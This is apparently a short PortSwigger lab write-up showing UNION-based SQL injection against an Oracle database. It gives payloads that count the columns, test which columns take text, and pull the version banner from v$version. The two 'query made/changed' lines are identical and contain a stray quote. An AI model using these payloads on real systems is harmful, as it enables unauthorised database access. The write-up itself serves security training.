## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/94218c08-e540-417e-ba81-0ad2e33eb29e)

## Solution :

#### Determine the number of columns 

caputred request

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8e64ddd1-3a37-47aa-a654-b5c59053a92c)

Quary made-

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL FROM dual--
```
Quary changed-

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ' UNION SELECT NULL,NULL FROM dual--
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/dc609252-4473-4d87-b4ad-1e3111d71248)


there are 2 columns being retreived.

#### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'a','b' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/25b0b3a5-bdeb-4c98-8b2f-7f77b336e390)


#### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/2d28d4ae-6fda-41bc-9f64-bcf419917157)

lab solved.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d4f28761-482e-4e2a-872f-d7a0a6a99258)
